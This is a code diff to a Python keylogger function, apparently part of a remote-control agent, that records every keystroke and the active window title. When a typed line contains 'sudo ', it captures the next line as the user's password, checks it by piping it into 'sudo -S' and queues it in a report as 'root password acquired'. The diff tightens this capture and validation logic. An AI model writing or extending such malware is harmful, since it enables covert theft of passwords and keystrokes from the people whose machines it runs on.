@@ -1,6 +1,7 @@
 def keylog(task_id):
 
-    global responses   
+    global responses
+    global stopping_functions 
 
 
     def get_active_window_title():
@@ -25,14 +26,15 @@ def keylog(task_id):
     def keylogger():
 
         def on_press(key):
+
             global line
             global nextIsPsw
             global sudo
             global break_function
 
-            if break_function:
+            if "keylog" in stopping_functions:
 
-                print("\t break detected, stopping keylog")
+                print(colored("\t - Keylogger stopped", "red"))
 
                 response = {
                         "task_id": task_id,
@@ -57,64 +59,63 @@ def keylog(task_id):
                     if key.name == "backspace":
                         if len(line) > 0:
                             line = line[:-1]
+                            
+                    elif key.name == "space":
+                        line += " "
 
                     elif key.name == "enter":
 
-                        if nextIsPsw == True:
+                        print(nextIsPsw)
 
-                            subprocess.call('echo ' + line + ' | sudo -S touch fileToCheckSudo', shell=True)
+                        if nextIsPsw == True:  
+                            
+                            print("I GOT THE PASSWORD: {}".format(line))
 
-                            print("[FILE CREATO]: " + line)
+                            cmd = "echo {} | sudo -S touch fileToCheckSudo.asd".format(line)
 
-                            with open('out.txt','w+') as fout:
-                                with open('err.txt','w+') as ferr:
-                                    out=subprocess.call(["ls",'fileToCheckSudo'],stdout=fout,stderr=ferr)
-                                    fout.flush()
-                                    ferr.flush()
-                                    fout.close()
-                                    ferr.close()
+                            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+                            stdout, stderr = p.communicate()
 
-                            f = open("out.txt", "r")
-                            output = f.read()
-                            f.flush()
-                            f.close()
-                            os.remove("out.txt")
-                            os.remove("err.txt")
-                            os.remove("fileToCheckSudo")
+                            p = subprocess.Popen(["ls"], stdout=subprocess.PIPE)
+                            stdout, stderr = p.communicate()   
 
-                            if "fileToCheckSudo" in output:
+                            if "fileToCheckSudo.asd" in str(stdout):
+                                cmd = "echo {} | sudo -S rm fileToCheckSudo.asd".format(line)
+                                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+                            
                                 response = {
                                         "task_id": task_id,
-                                        "user_output": "SUDO password stolen: " + line,
+                                        "user_output": "root password acquired: {}".format(line),
                                         "user": getpass.getuser(),
-                                        "window_title": window_title, 
-                                        "keystrokes": line,
-                                        "completed": True
+                                        "window_title": get_active_window_title(), 
+                                        "keystrokes": line + "\n",
                                     }
-                                responses.append(response)
-                                nextIsPsw == False
+
+                                responses.append(response)                           
+                                nextIsPsw = False
                                 sudo = line
-                                line = ""
-                                return False
-                            else:
-                                print("[NO PASSWORD]")
-                                nextIsPsw == False
-                                                 
 
-                        if 'sudospace' in line:
-                            nextIsPsw = True
+                            line = ""
+
+                        else:    
+                            if 'sudo ' in line:
+                                print("Next should be password")
+                                nextIsPsw = True
+
+                            response = {
+                                    "task_id": task_id,
+                                    "user": getpass.getuser(), 
+                                    "window_title": get_active_window_title(), 
+                                    "keystrokes": line + "\n",
+                                }
+                            responses.append(response)
+                            line = ""
 
 
-                        line = line + "\n"
-
-                        response = {
-                                "task_id": task_id,
-                                "user": getpass.getuser(), 
-                                "window_title": get_active_window_title(), 
-                                "keystrokes": line,
-                            }
-                        responses.append(response)
-                        line = ""
+                    elif key.name == "shift" or key.name == "ctrl" or key.name == "alt" or key.name == "caps_lock" or key.name == "tab":
+                        if "crtlc" in line:
+                            line = ""
+                            nextIsPsw = False
                     else:
                         line = line + key.name
                 except:
@@ -130,7 +131,7 @@ def keylog(task_id):
     thread2 = threading.Thread(target=keylogger, args=())
     thread2.start()
 
-    print("\t- Keylog Done")
+    print("\t- Keylog Running")
 
 line = ""
 nextIsPsw = False
